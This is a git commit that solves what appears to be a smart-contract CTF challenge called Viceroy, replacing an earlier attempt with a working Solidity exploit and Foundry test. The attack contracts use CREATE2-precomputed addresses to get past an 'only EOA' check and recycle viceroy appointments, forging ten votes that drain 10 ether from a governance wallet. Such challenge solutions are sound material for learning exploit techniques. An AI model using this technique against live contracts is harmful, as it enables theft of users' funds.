4b2aa9b794510dd67eb605a77f4255c2b32721e8
Evgenii Kireev <kireev228@gmail.com>
2024-12-06 06:12:50 -0300

    solved Viceroy

--- src/Viceroy.sol
+++ src/Viceroy.sol
@@ -1,188 +1,268 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import { Address } from '@openzeppelin/contracts/utils/Address.sol';
-import { ERC721 } from '@openzeppelin/contracts/token/ERC721/ERC721.sol';
-import { IERC721 } from '@openzeppelin/contracts/token/ERC721/IERC721.sol';
-import { Ownable } from '@openzeppelin/contracts/access/Ownable.sol';
-import { Test, console } from 'forge-std/Test.sol';
+import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
+import {Test, console} from "forge-std/Test.sol";
 
 contract OligarchyNFT is ERC721 {
-  constructor(address attacker) ERC721('Oligarch', 'OG') {
-    _mint(attacker, 1);
-  }
+    constructor(address attacker) ERC721("Oligarch", "OG") {
+        _mint(attacker, 1);
+    }
 
-  function _beforeTokenTransfer(address from, address, uint256, uint256) internal pure {
-    require(from == address(0), 'Cannot transfer nft'); // oligarch cannot transfer the NFT
-  }
+    function _beforeTokenTransfer(address from, address, uint256, uint256) internal pure {
+        require(from == address(0), "Cannot transfer nft"); // oligarch cannot transfer the NFT
+    }
 }
 
 contract Governance {
-  IERC721 private immutable oligargyNFT;
-  CommunityWallet public immutable communityWallet;
+    IERC721 private immutable oligargyNFT;
+    CommunityWallet public immutable communityWallet;
 
-  mapping(uint256 => bool) public idUsed;
-  mapping(address => bool) public alreadyVoted;
+    mapping(uint256 => bool) public idUsed;
+    mapping(address => bool) public alreadyVoted;
 
-  struct Appointment {
-    //approvedVoters: mapping(address => bool),
-    uint256 appointedBy; // oligarchy ids are > 0 so we can use this as a flag
-    uint256 numAppointments;
-    mapping(address => bool) approvedVoter;
-  }
-
-  struct Proposal {
-    uint256 votes;
-    bytes data;
-  }
-
-  mapping(address => Appointment) public viceroys;
-  mapping(uint256 => Proposal) public proposals;
-
-  constructor(ERC721 _oligarchyNFT) payable {
-    oligargyNFT = _oligarchyNFT;
-    communityWallet = new CommunityWallet{ value: msg.value }(address(this));
-  }
-
-  // CommunityWallet-exex() <= executeProposal (proposals[proposal].votes >= 10)
-  // get votes need to call voteOnProposal / create proposal + msg.sender needs approvedVoter + !alreadyVoted
-  // createProposal <= msg.sender is a viceroy + approveVoter
-
-  /*
-   * @dev an oligarch can appoint a viceroy if they have an NFT
-   * @param viceroy: the address who will be able to appoint voters
-   * @param id: the NFT of the oligarch
-   */
-  function appointViceroy(address viceroy, uint256 id) external {
-    console.log('--------------------------------');
-    console.log('1_msg.sender', msg.sender);
-    console.log('1_viceroy', viceroy);
-    console.log('--------------------------------');
-
-    require(oligargyNFT.ownerOf(id) == msg.sender, 'not an oligarch');
-    require(!idUsed[id], 'already appointed a viceroy');
-    require(viceroy.code.length == 0, 'only EOA');
-
-    idUsed[id] = true;
-    viceroys[viceroy].appointedBy = id;
-    viceroys[viceroy].numAppointments = 5;
-  }
-
-  function deposeViceroy(address viceroy, uint256 id) external {
-    require(oligargyNFT.ownerOf(id) == msg.sender, 'not an oligarch');
-    require(viceroys[viceroy].appointedBy == id, 'only the appointer can depose');
-
-    idUsed[id] = false;
-    delete viceroys[viceroy];
-  }
-
-  function approveVoter(address voter) external {
-    require(viceroys[msg.sender].appointedBy != 0, 'not a viceroy');
-    require(voter != msg.sender, 'cannot add yourself');
-    require(!viceroys[msg.sender].approvedVoter[voter], 'cannot add same voter twice');
-    require(viceroys[msg.sender].numAppointments > 0, 'no more appointments');
-    require(voter.code.length == 0, 'only EOA');
-
-    console.log('--------------------------------');
-    console.log('2_msg.sender', msg.sender);
-    console.log('2_voter', voter);
-    console.log('--------------------------------');
-
-    viceroys[msg.sender].numAppointments -= 1;
-    //       attackerHelper            voter
-    viceroys[msg.sender].approvedVoter[voter] = true;
-  }
-
-  function disapproveVoter(address voter) external {
-    require(viceroys[msg.sender].appointedBy != 0, 'not a viceroy');
-    require(viceroys[msg.sender].approvedVoter[voter], 'cannot disapprove an unapproved address');
-    viceroys[msg.sender].numAppointments += 1;
-    delete viceroys[msg.sender].approvedVoter[voter];
-  }
-
-  function createProposal(address viceroy, bytes calldata proposal) external {
-    require(
-      viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
-      'sender not a viceroy or voter'
-    );
-
-    uint256 proposalId = uint256(keccak256(proposal));
-    proposals[proposalId].data = proposal;
-  }
-
-  // msg.sender have to be an approved voter && do not voted
-  function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
-    // console.log('--------------------------------');
-    // console.log('viceroy', viceroy);
-    // console.log('msg.sender', msg.sender);
-    // console.log('approvedVoter', viceroys[viceroy].approvedVoter[msg.sender]);
-    // console.log('--------------------------------');
-    require(proposals[proposal].data.length != 0, 'proposal not found');
-    require(viceroys[viceroy].approvedVoter[msg.sender], 'Not an approved voter'); // viceroy approved by
-    require(!alreadyVoted[msg.sender], 'Already voted');
-
-    if (inFavor) {
-      proposals[proposal].votes += 1;
+    struct Appointment {
+        uint256 appointedBy;
+        uint256 numAppointments;
+        mapping(address => bool) approvedVoter;
     }
-    alreadyVoted[msg.sender] = true;
-  }
 
-  function executeProposal(uint256 proposal) external {
-    require(proposals[proposal].votes >= 10, 'Not enough votes');
-    (bool res, ) = address(communityWallet).call(proposals[proposal].data);
-    require(res, 'call failed');
-  }
+    struct Proposal {
+        uint256 votes;
+        bytes data;
+    }
+
+    mapping(address => Appointment) public viceroys;
+    mapping(uint256 => Proposal) public proposals;
+
+    constructor(ERC721 _oligarchyNFT) payable {
+        oligargyNFT = _oligarchyNFT;
+        communityWallet = new CommunityWallet{value: msg.value}(address(this));
+    }
+
+    /*
+    * @dev an oligarch can appoint a viceroy if they have an NFT
+    * @param viceroy: the address who will be able to appoint voters
+    * @param id: the NFT of the oligarch
+    */
+    function appointViceroy(address viceroy, uint256 id) external {
+        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
+        require(!idUsed[id], "already appointed a viceroy");
+        require(viceroy.code.length == 0, "only EOA");
+
+        idUsed[id] = true;
+        viceroys[viceroy].appointedBy = id;
+        viceroys[viceroy].numAppointments = 5;
+    }
+
+    function deposeViceroy(address viceroy, uint256 id) external {
+        require(oligargyNFT.ownerOf(id) == msg.sender, "not an oligarch");
+        require(viceroys[viceroy].appointedBy == id, "only the appointer can depose");
+
+        idUsed[id] = false;
+        delete viceroys[viceroy];
+    }
+
+    function approveVoter(address voter) external {
+        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
+        require(voter != msg.sender, "cannot add yourself");
+        require(!viceroys[msg.sender].approvedVoter[voter], "cannot add same voter twice");
+        require(viceroys[msg.sender].numAppointments > 0, "no more appointments");
+        require(voter.code.length == 0, "only EOA");
+
+        viceroys[msg.sender].numAppointments -= 1;
+        viceroys[msg.sender].approvedVoter[voter] = true;
+    }
+
+    function disapproveVoter(address voter) external {
+        require(viceroys[msg.sender].appointedBy != 0, "not a viceroy");
+        require(viceroys[msg.sender].approvedVoter[voter], "cannot disapprove an unapproved address");
+        viceroys[msg.sender].numAppointments += 1;
+        delete viceroys[msg.sender].approvedVoter[voter];
+    }
+
+    function createProposal(address viceroy, bytes calldata proposal) external {
+        require(
+            viceroys[msg.sender].appointedBy != 0 || viceroys[viceroy].approvedVoter[msg.sender],
+            "sender not a viceroy or voter"
+        );
+
+        uint256 proposalId = uint256(keccak256(proposal));
+        proposals[proposalId].data = proposal;
+    }
+
+    function voteOnProposal(uint256 proposal, bool inFavor, address viceroy) external {
+        require(proposals[proposal].data.length != 0, "proposal not found");
+        require(viceroys[viceroy].approvedVoter[msg.sender], "Not an approved voter"); // viceroy approved by
+        require(!alreadyVoted[msg.sender], "Already voted");
+
+        if (inFavor) {
+            proposals[proposal].votes += 1;
+        }
+        alreadyVoted[msg.sender] = true;
+    }
+
+    function executeProposal(uint256 proposal) external {
+        console.log("proposal", proposal); // 20951231332519530260451331881527447272654800164248699379398565663309763569704
+        console.log("votes", proposals[proposal].votes); // 10
+        require(proposals[proposal].votes >= 10, "Not enough votes");
+        (bool res,) = address(communityWallet).call(proposals[proposal].data);
+        require(res, "call failed");
+    }
 }
 
 contract CommunityWallet {
-  address public governance;
+    address public governance;
 
-  constructor(address _governance) payable {
-    governance = _governance;
-  }
+    constructor(address _governance) payable {
+        governance = _governance;
+    }
 
-  function exec(address target, bytes calldata data, uint256 value) external {
-    require(msg.sender == governance, 'Caller is not governance contract');
-    (bool res, ) = target.call{ value: value }(data);
-    require(res, 'call failed');
-  }
+    function exec(address target, bytes calldata data, uint256 value) external {
+        require(msg.sender == governance, "Caller is not governance contract");
+        (bool res,) = target.call{value: value}(data);
+        require(res, "call failed");
+    }
 
-  fallback() external payable {}
+    fallback() external payable {}
 }
 
-contract AttackerHelper {
-  address public governance;
-  address public viceroy;
-  address public voter;
+contract Attacker {
+    CreateViceroyFactory private factory;
+    Viceroy private viceroy1;
+    Viceroy private viceroy2;
 
-  uint256 constant ETH_AMOUNT = 10 ether;
-  bytes public proposalData;
+    address private governance;
 
-  constructor(address _governance, address _viceroy, address _voter) {
-    governance = _governance;
-    viceroy = _viceroy;
-    voter = _voter;
-    proposalData = abi.encodeWithSignature('exec(address,bytes,uint256)', _viceroy, '', ETH_AMOUNT);
-    Governance(_governance).approveVoter(_voter);
-    Governance(_governance).createProposal(_viceroy, proposalData);
-    Governance(_governance).disapproveVoter(_voter);
-  }
+    uint256 constant ETH_AMOUNT = 10 ether;
+    uint256 constant SALT1 = 1;
+    uint256 constant SALT2 = 2;
+    bytes PROPOSAL = abi.encodeWithSignature("exec(address,bytes,uint256)", address(this), "", ETH_AMOUNT);
+
+    constructor() {
+        factory = new CreateViceroyFactory();
+    }
+
+    receive() external payable {}
+
+    function init(address _governance) external {
+        governance = _governance;
+    }
+
+    function attack() external {
+        bytes memory bytecode = factory.getBytecode(governance, PROPOSAL);
+        address viceroyAddress1 = factory.getAddress(bytecode, SALT1);
+        Governance(governance).appointViceroy(viceroyAddress1, 1);
+        viceroy1 = factory.deploy(SALT1, governance, PROPOSAL);
+        viceroy1.attack(1);
+        attack2();
+
+        Governance(governance).executeProposal(uint256(keccak256(PROPOSAL)));
+    }
+
+    function attack2() private {
+        bytes memory bytecode = factory.getBytecode(governance, PROPOSAL);
+        address viceroyAddress2 = factory.getAddress(bytecode, SALT2);
+        Governance(governance).deposeViceroy(address(viceroy1), 1);
+        Governance(governance).appointViceroy(viceroyAddress2, 1);
+        viceroy2 = factory.deploy(SALT2, governance, PROPOSAL);
+        viceroy2.attack(4);
+    }
 }
 
-contract Create2Factory {
-  AttackerHelper public deployedContract;
+contract Viceroy {
+    CreateVoterFactory private factory;
+    Voter[] private voters;
 
-  function deploy(uint256 _salt, address _governance, address _viceroy, address _voter) external {
-    deployedContract = new AttackerHelper{ salt: bytes32(_salt) }(_governance, _viceroy, _voter);
-  }
+    address public governance;
+    bytes public proposal;
 
-  function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
-    bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
-    return address(uint160(uint256(hash)));
-  }
+    constructor(address _governance, bytes memory _proposal) {
+        factory = new CreateVoterFactory();
+        governance = _governance;
+        proposal = _proposal;
+    }
 
-  function getBytecode(address _governance, address _viceroy, address _voter) public pure returns (bytes memory) {
-    bytes memory bytecode = type(AttackerHelper).creationCode;
-    return abi.encodePacked(bytecode, abi.encode(_governance, _viceroy, _voter));
-  }
+    function attack(uint256 _startSalt) external {
+        uint256 proposalId = uint256(keccak256(proposal));
+
+        for (uint256 i = _startSalt; i <= _startSalt + 4; i++) {
+            address voterAddress = getVoterAddress(i, proposalId);
+            Governance(governance).approveVoter(voterAddress);
+
+            Voter newVoter = factory.deploy(i, governance, proposalId, address(this));
+            voters.push(newVoter);
+        }
+        vote();
+    }
+
+    function getVoterAddress(uint256 _salt, uint256 proposalId) private view returns (address voterAddress) {
+        bytes memory bytecode = factory.getBytecode(governance, proposalId, address(this));
+        voterAddress = factory.getAddress(bytecode, _salt);
+    }
+
+    function vote() private {
+        Governance(governance).createProposal(address(this), proposal);
+        for (uint256 i = 0; i < voters.length; i++) {
+            voters[i].vote();
+        }
+    }
+}
+
+contract Voter {
+    address public governance;
+    uint256 public proposalId;
+    address public viceroy;
+
+    constructor(address _governance, uint256 _proposalId, address _viceroy) {
+        governance = _governance;
+        proposalId = _proposalId;
+        viceroy = _viceroy;
+    }
+
+    function vote() external {
+        Governance(governance).voteOnProposal(proposalId, true, viceroy);
+    }
+}
+
+contract CreateViceroyFactory {
+    function deploy(uint256 _salt, address _governance, bytes memory _proposal) external returns (Viceroy viceroy) {
+        viceroy = new Viceroy{salt: bytes32(_salt)}(_governance, _proposal);
+    }
+
+    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
+        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
+        return address(uint160(uint256(hash)));
+    }
+
+    function getBytecode(address _governance, bytes memory _proposal) public pure returns (bytes memory) {
+        bytes memory bytecode = type(Viceroy).creationCode;
+        return abi.encodePacked(bytecode, abi.encode(_governance, _proposal));
+    }
+}
+
+contract CreateVoterFactory {
+    function deploy(uint256 _salt, address _governance, uint256 _proposalId, address _viceroy)
+        external
+        returns (Voter voter)
+    {
+        voter = new Voter{salt: bytes32(_salt)}(_governance, _proposalId, _viceroy);
+    }
+
+    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
+        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
+        return address(uint160(uint256(hash)));
+    }
+
+    function getBytecode(address _governance, uint256 _proposalId, address _viceroy)
+        public
+        pure
+        returns (bytes memory)
+    {
+        bytes memory bytecode = type(Voter).creationCode;
+        return abi.encodePacked(bytecode, abi.encode(_governance, _proposalId, _viceroy));
+    }
 }
--- test/Viceroy.t.sol
+++ test/Viceroy.t.sol
@@ -1,80 +1,34 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import { Test, console } from 'forge-std/Test.sol';
-import { Governance } from '../src/Viceroy.sol';
-import { OligarchyNFT } from '../src/Viceroy.sol';
-import { CommunityWallet } from '../src/Viceroy.sol';
-import { AttackerHelper } from '../src/Viceroy.sol';
-import { Create2Factory } from '../src/Viceroy.sol';
+import {Test, console} from "forge-std/Test.sol";
+import {Governance} from "../src/Viceroy.sol";
+import {OligarchyNFT} from "../src/Viceroy.sol";
+import {CommunityWallet} from "../src/Viceroy.sol";
+import {Attacker} from "../src/Viceroy.sol";
 
 contract ViceroyTest is Test {
-  Governance public governance;
-  OligarchyNFT public oligarch;
+    Governance public governance;
+    OligarchyNFT public oligarch;
+    Attacker public attacker;
 
-  AttackerHelper public attackerHelper;
-  Create2Factory public factory;
+    uint256 constant ETH_AMOUNT = 10 ether;
 
-  address public attacker;
-  address public viceroy;
-  address public voter;
+    function setUp() public {
+        attacker = new Attacker();
+        oligarch = new OligarchyNFT(address(attacker));
+        governance = new Governance{value: ETH_AMOUNT}(oligarch);
+        address wallet = address(governance.communityWallet());
+        assertEq(wallet.balance, ETH_AMOUNT, "Governance should have 10 ether");
+        attacker.init(address(governance));
+    }
 
-  uint256 constant SALT = 347309243929;
-  uint256 constant ETH_AMOUNT = 10 ether;
+    function testAttack2() public {
+        uint256 attackerBalanceBefore = address(attacker).balance;
+        attacker.attack();
+        uint256 attackerBalanceAfter = address(attacker).balance;
+        uint256 diff = attackerBalanceAfter - attackerBalanceBefore;
 
-  function setUp() public {
-    attacker = makeAddr('attacker');
-    viceroy = makeAddr('viceroy');
-    voter = makeAddr('voter');
-
-    oligarch = new OligarchyNFT(attacker);
-    governance = new Governance{ value: ETH_AMOUNT }(oligarch);
-    factory = new Create2Factory();
-
-    address wallet = address(governance.communityWallet());
-    assertEq(wallet.balance, ETH_AMOUNT, 'Governance should have 10 ether');
-  }
-
-  function deploy() public {
-    bytes memory bytecode = factory.getBytecode(address(governance), viceroy, voter);
-    address addr = factory.getAddress(bytecode, SALT);
-
-    governance.appointViceroy(addr, 1);
-    factory.deploy(SALT, address(governance), viceroy, voter);
-    attackerHelper = factory.deployedContract();
-
-    assertEq(addr, address(attackerHelper), 'Deployed contract should be the same');
-  }
-
-  function testAttack() public {
-    checkAddresses();
-    // //uint256 nonceBefore = vm.getNonce(attackerWallet);
-    vm.startPrank(attacker);
-    deploy();
-    vm.stopPrank();
-
-    vm.startPrank(voter);
-    governance.voteOnProposal(uint256(keccak256(attackerHelper.proposalData())), true, address(attackerHelper));
-    vm.stopPrank();
-
-    //governance.voteOnProposal(uint256(keccak256(deployedContract2.PROPOSAL())), true, attacker);
-
-    // assertEq(address(communityWallet).balance, 0, 'Community wallet should be empty after attack');
-    // //assertEq(vm.getNonce(attackerWallet) - nonceBefore, 1, 'Must exploit in one transaction');
-    // uint256 attackerBalance = address(attackerWallet).balance;
-    // assertTrue(attackerBalance >= 10 ether, 'Attacker should have gained at least 10 ether');
-  }
-
-  function voterVote() public {
-    vm.startPrank(voter);
-    governance.voteOnProposal(uint256(keccak256(attackerHelper.proposalData())), true, address(attackerHelper));
-    vm.stopPrank();
-  }
-
-  function checkAddresses() public {
-    console.log('attacker', attacker);
-    console.log('attackerHelper', address(attackerHelper));
-
-    console.log('voter', address(voter));
-  }
+        assertTrue(diff == 10 ether, "Attacker should have gained at least 10 ether");
+    }
 }
